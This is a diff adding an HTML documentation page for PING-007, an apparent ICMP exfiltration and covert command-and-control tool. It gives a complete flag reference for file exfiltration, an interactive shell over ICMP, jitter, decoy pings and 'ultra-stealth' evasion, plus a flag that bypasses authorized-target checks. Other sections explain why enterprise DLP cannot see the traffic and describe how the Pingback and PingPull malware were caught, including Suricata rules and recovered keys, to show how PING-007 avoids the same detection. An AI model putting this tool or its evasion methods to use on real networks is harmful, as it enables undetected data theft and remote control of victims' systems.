+<span class="prompt">$ </span><span class="cmd">sudo ./build/ping-007 apt</span> <span class="flag">-t</span> 192.168.1.100 <span class="flag">-r</span> lazarus <span class="flag">--duration</span> 3600 <span class="flag">-p</span> <span class="str">"key"</span><br><br>
+<span class="comment"># Profiles: lazarus | apt29 | apt28 | equation</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- flag table -->
+    <div style="margin-top:48px;">
+      <h3 style="font-family:var(--serif);font-size:22px;color:var(--white);margin-bottom:24px;">Flag reference</h3>
+      <table class="algo-table" style="background:var(--card);">
+        <thead>
+          <tr><th>Command</th><th>Flag</th><th>Default</th><th>Description</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>global</td><td><code style="font-family:var(--mono)">-p / --password</code></td><td>—</td><td>Shared password — required for interoperable crypto</td></tr>
+          <tr><td>global</td><td><code style="font-family:var(--mono)">--no-banner</code></td><td>false</td><td>Suppress JSON logs and startup banner</td></tr>
+          <tr><td>global</td><td><code style="font-family:var(--mono)">-c / --config</code></td><td>./config/ping-007.yml</td><td>Config file path — explicit path bypasses the default search order</td></tr>
+          <tr><td>global</td><td><code style="font-family:var(--mono)">--allow-all-targets</code></td><td>false</td><td>Bypass <code style="font-family:var(--mono)">authorized_targets</code> / <code style="font-family:var(--mono)">forbidden_targets</code> CIDR validation — use in lab or red team ops where the config whitelist blocks the actual target</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">-t / --target</code></td><td>required</td><td>Target IP address</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">-d / --data</code></td><td>—</td><td>Inline data to transmit</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--signature</code></td><td>linux</td><td>OS ping pattern: <code style="font-family:var(--mono)">linux</code>, <code style="font-family:var(--mono)">windows</code>, <code style="font-family:var(--mono)">none</code></td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--delay</code></td><td>0</td><td>Pre-send delay: <code style="font-family:var(--mono)">2s</code>, <code style="font-family:var(--mono)">500ms</code></td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--human-timing</code></td><td>false</td><td>Random 1–5s intervals between packets</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--ultra-stealth</code></td><td>false</td><td>All evasion techniques combined (timing + size + pattern)</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--decoy-pings</code></td><td>0</td><td>Send N clean OS-pattern pings before data to blend into traffic</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--after-pings</code></td><td>0</td><td>Send N clean pings after data to close session naturally</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--ping-interval</code></td><td>1s</td><td>Interval between pings in a sequence (mirrors real <code style="font-family:var(--mono)">ping</code>)</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--icmp-id</code></td><td>os</td><td>ICMP identifier override: <code style="font-family:var(--mono)">os</code> (PID on Linux / <code style="font-family:var(--mono)">0x0001</code> on Windows), <code style="font-family:var(--mono)">random</code>, or a numeric 0–65535 value</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--no-encrypt</code></td><td>false</td><td>Send plaintext — no encryption, no encoding (raw bytes in ICMP)</td></tr>
+          <tr><td>basic</td><td><code style="font-family:var(--mono)">--encode</code></td><td>false</td><td>Base64-encode payload only (lower entropy than AES, no confidentiality)</td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">-f / --file</code></td><td>required</td><td>File to exfiltrate</td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">--mode</code></td><td>stealth</td><td><code style="font-family:var(--mono)">stealth</code> (5–30s gap), <code style="font-family:var(--mono)">fast</code> (no delay), <code style="font-family:var(--mono)">covert</code> (30–120s gap)</td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">--chunk-size</code></td><td>512</td><td>Base chunk size in bytes (±25% jitter applied per chunk)</td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">--no-encrypt</code></td><td>false</td><td>Plaintext payload (no crypto)</td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">--signature</code></td><td>linux</td><td>OS signature for TTL mimicry: <code style="font-family:var(--mono)">linux</code> (TTL=64), <code style="font-family:var(--mono)">windows</code> (TTL=128), <code style="font-family:var(--mono)">none</code></td></tr>
+          <tr><td>exfil</td><td><code style="font-family:var(--mono)">--icmp-id</code></td><td>os</td><td>ICMP identifier override: <code style="font-family:var(--mono)">os</code> (PID on Linux / <code style="font-family:var(--mono)">0x0001</code> on Windows), <code style="font-family:var(--mono)">random</code>, or a numeric 0–65535 value</td></tr>
+          <tr><td>shell</td><td><code style="font-family:var(--mono)">--mode</code></td><td>interactive</td><td><code style="font-family:var(--mono)">interactive</code> (C2 over ICMP) or <code style="font-family:var(--mono)">batch</code> (local execution only)</td></tr>
+          <tr><td>shell</td><td><code style="font-family:var(--mono)">--jitter</code></td><td>0</td><td>Max random delay before each command packet (e.g. <code style="font-family:var(--mono)">3s</code>); breaks metronomic C2 beacon detection</td></tr>
+          <tr><td>listen</td><td><code style="font-family:var(--mono)">-o / --output</code></td><td>./received</td><td>Output directory for received files</td></tr>
+          <tr><td>listen</td><td><code style="font-family:var(--mono)">--method</code></td><td>icmp_tunnel</td><td><code style="font-family:var(--mono)">icmp_tunnel</code> (default) or <code style="font-family:var(--mono)">icmp_payload</code></td></tr>
+          <tr><td>listen</td><td><code style="font-family:var(--mono)">--timeout</code></td><td>60</td><td>Timeout in seconds</td></tr>
+          <tr><td>listen</td><td><code style="font-family:var(--mono)">-q / --quiet</code></td><td>false</td><td>Suppress per-packet output (for real ops — verbose logging is an OPSEC risk)</td></tr>
+          <tr><td>apt</td><td><code style="font-family:var(--mono)">-r / --profile</code></td><td>required</td><td><code style="font-family:var(--mono)">lazarus</code> | <code style="font-family:var(--mono)">apt29</code> | <code style="font-family:var(--mono)">apt28</code> | <code style="font-family:var(--mono)">equation</code></td></tr>
+          <tr><td>apt</td><td><code style="font-family:var(--mono)">--duration</code></td><td>60</td><td>Simulation duration in seconds</td></tr>
+          <tr><td>apt</td><td><code style="font-family:var(--mono)">--list</code></td><td>false</td><td>Print all available timing profiles with intervals and exit (no root required)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- CRYPTO PROTOCOL -->
+<section id="crypto">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-label">Protocol</div>
+      <h2 class="sec-title">Cryptographic Details</h2>
+      <p class="sec-sub">Three AEAD algorithms with deterministic PBKDF2 key derivation. Algorithm auto-detected by receiver from 4-byte wire header.</p>
+    </div>
+
+    <h3 style="font-family:var(--sans);font-size:13px;font-weight:600;color:var(--silver);text-transform:uppercase;letter-spacing:.08em;margin-bottom:16px;">Algorithm suite</h3>
+    <table class="algo-table" style="background:var(--card);margin-bottom:48px;">
+      <thead>
+        <tr><th>Algorithm</th><th>Key</th><th>Auth</th><th>Salt (fixed)</th><th>Status</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>AES-256-GCM</td><td>256-bit</td><td>AEAD</td>
+          <td><code style="font-family:var(--mono)">ping007-aes-salt-v1</code></td>
+          <td><span class="badge badge-green">Active</span></td>
+        </tr>
+        <tr>
+          <td>ChaCha20-Poly1305</td><td>256-bit</td><td>AEAD</td>
+          <td><code style="font-family:var(--mono)">ping007-chacha20-salt-v1</code></td>
+          <td><span class="badge badge-green">Active</span></td>
+        </tr>
+        <tr>
+          <td>XOR-CFB + HMAC-SHA256</td><td>256-bit</td><td>HMAC</td>
+          <td><code style="font-family:var(--mono)">ping007-xor-salt-v1</code></td>
+          <td><span class="badge badge-green">Active</span></td>
+        </tr>
+        <tr>
+          <td>ECDH P-256 key exchange</td><td>—</td><td>—</td><td>—</td>
+          <td><span class="badge badge-grey">TODO</span></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3 style="font-family:var(--sans);font-size:13px;font-weight:600;color:var(--silver);text-transform:uppercase;letter-spacing:.08em;margin-bottom:16px;">Wire format</h3>
+    <div class="wire" style="margin-bottom:48px;">
+      <div class="wire-block"><div class="size">4 bytes</div><div class="name">Header</div><div class="desc">algo id + version</div></div>
+      <div class="wire-block"><div class="size">12 bytes</div><div class="name">Nonce</div><div class="desc">random per packet</div></div>
+      <div class="wire-block" style="flex:3"><div class="size">N bytes</div><div class="name">Ciphertext</div><div class="desc">encrypted payload</div></div>
+      <div class="wire-block"><div class="size">16 bytes</div><div class="name">Auth Tag</div><div class="desc">GCM / Poly1305</div></div>
+    </div>
+
+    <h3 style="font-family:var(--sans);font-size:13px;font-weight:600;color:var(--silver);text-transform:uppercase;letter-spacing:.08em;margin-bottom:16px;">Key derivation</h3>
+    <div class="term" style="margin-bottom:16px;">
+      <div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div></div>
+      <div class="term-body">
+<span class="comment"># For each algorithm independently:</span><br>
+key = <span class="out">PBKDF2</span>(SHA-256, password, salt_per_algo, iterations=100_000, keylen=32)<br><br>
+<span class="comment"># Same password → same key on both sides → no key exchange needed</span><br>
+<span class="comment"># Fixed salt = less secure than random, but enables passwordless setup</span>
+      </div>
+    </div>
+
+    <p style="font-size:13px;color:var(--silver);max-width:680px;line-height:1.7;">
+      The salt is fixed and baked into the binary. Security relies entirely on password strength — a weak password is weak regardless of 100k PBKDF2 iterations. Use at least 20 random characters. Rotate between operations.
+    </p>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- EVASION -->
+<section id="evasion" style="background: var(--dark);">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-label">Evasion</div>
+      <h2 class="sec-title">SOC &amp; DLP Evasion</h2>
+      <p class="sec-sub">Implemented techniques only. Nothing here is theoretical.</p>
+    </div>
+
+    <!-- DLP BYPASS CALLOUT -->
+    <div style="background:rgba(212,175,55,0.07);border:1px solid rgba(212,175,55,0.25);border-radius:8px;padding:28px 32px;margin-bottom:48px;">
+      <div style="font-family:var(--mono);font-size:11px;color:var(--gold);letter-spacing:2px;margin-bottom:12px;">WHY ENTERPRISE DLP CANNOT SEE THIS</div>
+      <p style="font-family:var(--mono);font-size:13px;color:var(--silver);line-height:1.8;margin-bottom:16px;">
+        Enterprise DLP solutions (Symantec, Forcepoint, Microsoft Purview) are <strong style="color:var(--white)">L7 application proxies</strong> targeting HTTP/S, SMTP, FTP and cloud APIs. ICMP is a network-layer diagnostic protocol with no application session — most DLP appliances <strong style="color:var(--gold)">do not decode ICMP payloads at all.</strong>
+      </p>
+      <div style="font-family:var(--mono);font-size:11px;color:#666;border-left:2px solid rgba(212,175,55,0.3);padding-left:16px;margin-bottom:20px;line-height:1.7;">
+        "Firewalls often permit outbound ICMP by default and only ensure that an Echo Reply matches a recent Echo Request, without inspecting the payload beyond length."<br>
+        <span style="color:#444;">— <a href="https://deepstrike.io/blog/what-is-icmp-tunneling" target="_blank" style="color:#666;text-decoration:underline;">DeepStrike Security Research</a> · confirmed by <a href="https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933" target="_blank" style="color:#666;text-decoration:underline;">Palo Alto LIVEcommunity</a> · <a href="https://www.vectra.ai/detections/icmp-tunnel" target="_blank" style="color:#666;text-decoration:underline;">Vectra AI</a> · <a href="https://labs.jumpsec.com/covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/" target="_blank" style="color:#666;text-decoration:underline;">JumpSec Labs</a></span>
+      </div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;">
+        <div style="background:rgba(0,0,0,0.3);border-radius:6px;padding:14px;">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--gold);margin-bottom:6px;">DLP LAYER</div>
+          <div style="font-family:var(--mono);font-size:11px;color:#555;">HTTP/S ✓<br>SMTP ✓<br>FTP ✓<br>ICMP <span style="color:#c0392b;">✗ blind</span></div>
+        </div>
+        <div style="background:rgba(0,0,0,0.3);border-radius:6px;padding:14px;">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--gold);margin-bottom:6px;">PACKET ON THE WIRE</div>
+          <div style="font-family:var(--mono);font-size:11px;color:#555;">64 bytes · TTL 64<br>type 8 · code 0<br>payload: timeval+seq<br><span style="color:#27ae60;">≡ real Linux ping</span></div>
+        </div>
+        <div style="background:rgba(0,0,0,0.3);border-radius:6px;padding:14px;">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--gold);margin-bottom:6px;">DATA EXFIL LOOKS LIKE</div>
+          <div style="font-family:var(--mono);font-size:11px;color:#555;">user doing<br><code style="color:var(--gold)">ping -c N target</code><br>1s intervals<br>constant 64B packets</div>
+        </div>
+        <div style="background:rgba(0,0,0,0.3);border-radius:6px;padding:14px;">
+          <div style="font-family:var(--mono);font-size:10px;color:var(--gold);margin-bottom:6px;">CONTENT INSPECTION</div>
+          <div style="font-family:var(--mono);font-size:11px;color:#555;">AES-256-GCM output<br>= pure random bytes<br>no PII regex match<br>no file signature</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VS OTHER TOOLS -->
+    <h3 style="font-family:var(--serif);font-size:20px;color:var(--white);margin-bottom:8px;">vs. other ICMP exfil tools</h3>
+    <p style="font-family:var(--mono);font-size:11px;color:#555;margin-bottom:20px;">icmpsh · ptunnel · PingPull · Pingback — they all work. None of them try to look like a real <code style="color:var(--gold)">ping</code>.</p>
+    <div style="overflow-x:auto;margin-bottom:48px;">
+      <table style="width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;">
+        <thead>
+          <tr style="border-bottom:1px solid #1a1a1a;">
+            <th style="text-align:left;padding:10px 14px;color:var(--gold);font-weight:normal;letter-spacing:1px;width:22%;">ASPECT</th>
+            <th style="text-align:left;padding:10px 14px;color:#555;font-weight:normal;">icmpsh / ptunnel</th>
+            <th style="text-align:left;padding:10px 14px;color:#555;font-weight:normal;">Pingback / PingPull</th>
+            <th style="text-align:left;padding:10px 14px;color:var(--silver);font-weight:normal;">PING-007</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Packet size</td>
+            <td style="padding:9px 14px;color:#c0392b;">Arbitrary — 200–1500B</td>
+            <td style="padding:9px 14px;color:#c0392b;">Fixed 788B / oversized blob</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>64B (Linux) / 40B (Windows) — exact OS</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Payload content</td>
+            <td style="padding:9px 14px;color:#c0392b;">Raw bytes / plaintext</td>
+            <td style="padding:9px 14px;color:#c0392b;">Plaintext struct / [8B prefix]+b64</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>XOR'd into real OS ping pattern</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">TTL</td>
+            <td style="padding:9px 14px;color:#c0392b;">Kernel default (unset)</td>
+            <td style="padding:9px 14px;color:#c0392b;">Kernel default (unset)</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>setsockopt: 64 (Linux) or 128 (Windows)</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">ICMP identifier</td>
+            <td style="padding:9px 14px;color:#c0392b;">PID or static constant</td>
+            <td style="padding:9px 14px;color:#c0392b;">Arbitrary constant</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>getpid() &amp; 0xFFFF (Linux) / 0x0001 (Windows) — matches real OS</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Sequence number</td>
+            <td style="padding:9px 14px;color:#c0392b;">Starts at 0</td>
+            <td style="padding:9px 14px;color:#c0392b;">Fixed {1234,1235,1236} / from 0</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>Starts at 1, +1 per packet — matches real OS ping</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Timing</td>
+            <td style="padding:9px 14px;color:#c0392b;">Burst / fixed interval</td>
+            <td style="padding:9px 14px;color:#c0392b;">Fixed / none documented</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>1s ± 10% jitter + inter-chunk gap</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Fragmentation</td>
+            <td style="padding:9px 14px;color:#c0392b;">Oversized single packet or IP frag</td>
+            <td style="padding:9px 14px;color:#c0392b;">Single oversized packet</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>N × 64B echo requests — each looks like real ping</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Decoy traffic</td>
+            <td style="padding:9px 14px;color:#c0392b;">None</td>
+            <td style="padding:9px 14px;color:#c0392b;">None</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>--decoy-pings / --after-pings</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Encryption</td>
+            <td style="padding:9px 14px;color:#c0392b;">None (icmpsh: plaintext)</td>
+            <td style="padding:9px 14px;color:#e67e22;">None / AES-CBC hardcoded keys</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>AES-256-GCM / ChaCha20 / XOR-CFB-HMAC + PBKDF2</strong></td>
+          </tr>
+          <tr>
+            <td style="padding:9px 14px;color:#666;">Flagged by size rule?</td>
+            <td style="padding:9px 14px;color:#c0392b;">Yes — always</td>
+            <td style="padding:9px 14px;color:#c0392b;">Yes — always</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>No — identical to ping -s 56</strong></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- APT IN THE WILD COMPARISON -->
+    <h3 style="font-family:var(--serif);font-size:20px;color:var(--white);margin-bottom:8px;">vs. documented APT ICMP tools</h3>
+    <p style="font-family:var(--mono);font-size:11px;color:#555;margin-bottom:4px;">Two tools with published technical analysis used ICMP as primary C2. Same premise — ICMP bypasses DLP. Neither asked the next question: <span style="color:var(--white);">"does my packet actually look like a real OS ping?"</span> They stuffed data into the payload field and shipped it. Both were caught for avoidable reasons. PING-007 was built to answer that question correctly.</p>
+    <p style="font-family:var(--mono);font-size:10px;color:#333;margin-bottom:20px;">Sources: <a href="https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/" style="color:#444;">Trustwave SpiderLabs (Pingback, 2021)</a> · <a href="https://unit42.paloaltonetworks.com/pingpull-gallium/" style="color:#444;">Unit42 / Palo Alto (PingPull, 2022)</a> · <a href="https://github.com/corelight/pingback" style="color:#444;">Corelight Zeek detection</a></p>
+
+    <!-- Pingback strip -->
+    <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:20px;margin-bottom:16px;">
+      <div style="display:flex;align-items:center;gap:16px;margin-bottom:14px;">
+        <div style="font-family:var(--mono);font-size:13px;color:var(--white);">Pingback</div>
+        <div style="font-family:var(--mono);font-size:10px;color:#555;">2021 · unattributed · Windows · ICMP-only C2</div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div>
+          <div style="font-family:var(--mono);font-size:10px;color:#c0392b;letter-spacing:1px;margin-bottom:8px;">ICMP WIRE FORMAT</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#555;line-height:2;">Type 8 (Echo Request) only<br>Payload: <span style="color:#c0392b;font-weight:bold;">fixed 788 bytes</span> — C struct<br>Seq: <span style="color:#c0392b;font-weight:bold;">always {1234, 1235, 1236}</span><br>&nbsp;&nbsp;1234 → command/data present<br>&nbsp;&nbsp;1235 → ack (data received)<br>&nbsp;&nbsp;1236 → notification (new data)<br>Encryption: <span style="color:#c0392b;font-weight:bold;">none</span> — plaintext commands<br>TTL: kernel default (uncontrolled)</div>
+        </div>
+        <div>
+          <div style="font-family:var(--mono);font-size:10px;color:#c0392b;letter-spacing:1px;margin-bottom:8px;">HOW IT WAS CAUGHT</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#555;line-height:2;"><span style="color:#c0392b;">①</span> Payload = 788B → no OS ping ever sends 788B<br>&nbsp;&nbsp;&nbsp;Suricata: <code style="color:#888;">itype:8; dsize:788;</code> → 100% catch<br><span style="color:#c0392b;">②</span> Seq ∈ {1234,1235,1236} → Zeek Corelight pkg<br>&nbsp;&nbsp;&nbsp;(net byte order: 53764 / 54020 / 54276)<br><span style="color:#c0392b;">③</span> Payload offset 0 = <code style="color:#888;">"shell\x00..."</code><br>&nbsp;&nbsp;&nbsp;Suricata content match on plaintext string</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PingPull strip -->
+    <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:20px;margin-bottom:24px;">
+      <div style="display:flex;align-items:center;gap:16px;margin-bottom:14px;">
+        <div style="font-family:var(--mono);font-size:13px;color:var(--white);">PingPull</div>
+        <div style="font-family:var(--mono);font-size:10px;color:#555;">2022 · GALLIUM / Alloy Taurus (CN, likely state-sponsored) · Windows · ICMP / HTTPS / TCP swappable</div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+        <div>
+          <div style="font-family:var(--mono);font-size:10px;color:#e67e22;letter-spacing:1px;margin-bottom:8px;">ICMP WIRE FORMAT</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#555;line-height:2;">Type 8 (Echo Request) / Type 0 (Reply)<br>Payload format:<br><code style="color:#888;font-size:9px;">[8B: 03 41 40 7E 04 37 24 70]</code><br><code style="color:#888;font-size:9px;">R[seq].[PROJECT_EXE_HOST_HEXIP]\r\n</code><br><code style="color:#888;font-size:9px;">total=[n]\r\ncurrent=[n]\r\n[b64(AES-CBC(cmd))]</code><br>Beacon heartbeat: total=0, current=0<br>Encryption: <span style="color:#e67e22;">AES-256-CBC</span><br>TTL: kernel default (uncontrolled)</div>
+        </div>
+        <div>
+          <div style="font-family:var(--mono);font-size:10px;color:#e67e22;letter-spacing:1px;margin-bottom:8px;">HOW IT WAS CAUGHT</div>
+          <div style="font-family:var(--mono);font-size:10px;color:#555;line-height:2;"><span style="color:#e67e22;">①</span> Non-OS payload: prefix <code style="color:#888;">03 41 40 7E 04 37 24 70</code><br>&nbsp;&nbsp;&nbsp;+ ASCII <code style="color:#888;">R[n].PROJECT_...</code> visible<br><span style="color:#e67e22;">②</span> AES keys <span style="color:#e67e22;font-weight:bold;">hardcoded in binary</span>:<br>&nbsp;&nbsp;&nbsp;<code style="color:#888;">P29456789A1234sS</code> (recovered by Unit42)<br>&nbsp;&nbsp;&nbsp;<code style="color:#888;">dC@133321Ikd!D^i</code><br>&nbsp;&nbsp;&nbsp;→ all historical PCAP traffic decryptable<br><span style="color:#e67e22;">③</span> <code style="color:#888;">PROJECT_HOST_IP</code> leaks asset fingerprint<br>&nbsp;&nbsp;&nbsp;in plaintext in every ICMP packet</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PING-007 comparison table -->
+    <div style="overflow-x:auto;margin-bottom:16px;">
+      <table style="width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;">
+        <thead>
+          <tr style="border-bottom:1px solid #1a1a1a;">
+            <th style="text-align:left;padding:10px 14px;color:var(--gold);font-weight:normal;letter-spacing:1px;width:20%;">ASPECT</th>
+            <th style="text-align:left;padding:10px 14px;color:#c0392b;font-weight:normal;">Pingback</th>
+            <th style="text-align:left;padding:10px 14px;color:#e67e22;font-weight:normal;">PingPull (GALLIUM)</th>
+            <th style="text-align:left;padding:10px 14px;color:#27ae60;font-weight:normal;">PING-007</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Packet size</td>
+            <td style="padding:9px 14px;color:#c0392b;"><strong>788B fixed</strong> — no OS does this</td>
+            <td style="padding:9px 14px;color:#e67e22;">Variable, oversized blob</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>64B (Linux) / 40B (Windows) — exact OS</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Payload content</td>
+            <td style="padding:9px 14px;color:#c0392b;">Plaintext C struct, <code>"shell\x00..."</code></td>
+            <td style="padding:9px 14px;color:#e67e22;">8B prefix + ASCII header + b64-AES</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>XOR into OS ping pattern (timeval / abcdefgh...)</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">TTL</td>
+            <td style="padding:9px 14px;color:#c0392b;">Kernel default</td>
+            <td style="padding:9px 14px;color:#e67e22;">Kernel default</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>setsockopt: 64 (Linux) / 128 (Windows)</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Sequence numbers</td>
+            <td style="padding:9px 14px;color:#c0392b;"><strong>{1234, 1235, 1236}</strong> — always</td>
+            <td style="padding:9px 14px;color:#e67e22;">Incremental from 0</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>Starts at 1, +1 per packet — identical to OS ping</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">ICMP identifier</td>
+            <td style="padding:9px 14px;color:#c0392b;">Not randomized</td>
+            <td style="padding:9px 14px;color:#e67e22;">Constant per session</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>getpid() &amp; 0xFFFF (Linux) / 0x0001 (Windows) — matches real OS</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Encryption</td>
+            <td style="padding:9px 14px;color:#c0392b;"><strong>None</strong></td>
+            <td style="padding:9px 14px;color:#e67e22;">AES-256-CBC, <strong>key in binary</strong></td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>PBKDF2(100k) → AES-256-GCM / ChaCha20</strong></td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Key in binary?</td>
+            <td style="padding:9px 14px;color:#888;">N/A</td>
+            <td style="padding:9px 14px;color:#c0392b;"><strong>Yes</strong> — recoverable by reversing</td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>No</strong> — runtime PBKDF2 from password</td>
+          </tr>
+          <tr style="border-bottom:1px solid #0f0f0f;">
+            <td style="padding:9px 14px;color:#666;">Asset fingerprint leak</td>
+            <td style="padding:9px 14px;color:#888;">None</td>
+            <td style="padding:9px 14px;color:#c0392b;"><strong>Hostname + exe + IP in every packet</strong></td>
+            <td style="padding:9px 14px;color:#27ae60;"><strong>Nothing</strong> — OS ping pattern only</td>
+          </tr>
+          <tr>
+            <td style="padding:9px 14px;color:#666;">Minimal catch rule</td>
+            <td style="padding:9px 14px;color:#c0392b;"><code>itype:8; dsize:788;</code></td>
+            <td style="padding:9px 14px;color:#e67e22;"><code>content:"PROJECT_";</code></td>
+            <td style="padding:9px 14px;color:#27ae60;"><em>No static indicator — OS-native id+seq, XOR'd OS pattern, variable size</em></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div style="background:#0a0a0a;border:1px solid #1f2a1f;border-radius:6px;padding:16px;margin-bottom:48px;">
+      <div style="font-family:var(--mono);font-size:10px;color:#27ae60;letter-spacing:1px;margin-bottom:10px;">PING-007 DESIGN RESPONSE TO EACH FAILURE MODE</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;font-family:var(--mono);font-size:10px;color:#555;line-height:1.9;">
+        <div><span style="color:#27ae60;">→ 788B anomaly</span><br>Sends exact OS size (64B/40B).<br>No size-based rule applies.</div>
+        <div><span style="color:#27ae60;">→ Fixed seq {1234,1235,1236}</span><br>Starts at 1, +1 per packet.<br>Matches OS ping behavior.</div>
+        <div><span style="color:#27ae60;">→ Hardcoded AES key</span><br>PBKDF2 at runtime. Binary<br>contains zero key material.</div>
+        <div><span style="color:#27ae60;">→ Plaintext in payload</span><br>XOR steganography into real<br>OS pattern. No regex match.</div>
+        <div><span style="color:#27ae60;">→ PROJECT_HOST_IP leak</span><br>Nothing in payload without key.<br>Looks like normal ping noise.</div>
+        <div><span style="color:#27ae60;">→ Default TTL fingerprint</span><br>setsockopt(IP_TTL): 64 or 128.<br>OS fingerprint returns correct.</div>
+      </div>
+    </div>
+
+    <!-- OS SIGNATURE COMPARISON -->
+    <h3 style="font-family:var(--serif);font-size:20px;color:var(--white);margin-bottom:20px;">OS Signature Profiles — Exact Wire Format</h3>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:48px;">
+      <div style="background:#0a0a0a;border:1px solid #1a1a1a;border-radius:8px;padding:20px;">
+        <div style="font-family:var(--mono);font-size:10px;color:var(--gold);letter-spacing:2px;margin-bottom:12px;">--signature linux (default)</div>
+        <div style="font-family:var(--mono);font-size:11px;color:#555;line-height:2;">
+          Total size: <span style="color:var(--silver)">64 bytes</span><br>
+          TTL: <span style="color:var(--silver)">64</span><br>
+          Payload: <span style="color:var(--silver)">56 bytes</span><br>
+          Structure: <span style="color:var(--silver)">[16B timeval LE][40B sequential 0x10,0x11…]</span><br>
